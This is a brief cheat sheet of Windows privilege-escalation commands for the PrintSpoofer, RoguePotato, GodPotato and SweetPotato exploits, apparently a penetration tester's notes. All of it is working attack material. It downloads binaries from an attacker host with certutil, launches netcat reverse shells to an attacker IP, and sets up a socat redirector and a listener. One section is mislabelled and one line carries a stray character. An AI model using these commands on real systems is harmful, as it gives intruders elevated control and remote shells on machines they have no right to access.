# PrintSpoofer
```bash
certutil -urlcache -f http://kali/PrintSpoofer64.exe PrintSpoofer64.exe

.\PrintSpoofer64.exe -i -c powershell.exe
```
-----------------------

# RoguePotato
```bash
# On victim
certutil -urlcache -f http://kali/RoguePotato.exe RoguePotato.exe
certutil -urlcache -f http://kali/nc64.exe nc64.exe

.\RoguePotato.exe -r kali-ip -e "C:\Users\Public\Documents\nc64.exe kali-ip 5555 -e cmd.exe" -l 9999

# On Kali
sudo socat tcp-listen:135,reuseaddr,fork tcp:victim-ip:9999
rlwrap nc -lvnp 5555
```

-----------------------

# RoguePotato
```bash
./GodPotato-NET2.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET35.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"n
```

# SweetPotato
```bash
.\SweetPotato.exe -a cmd
```
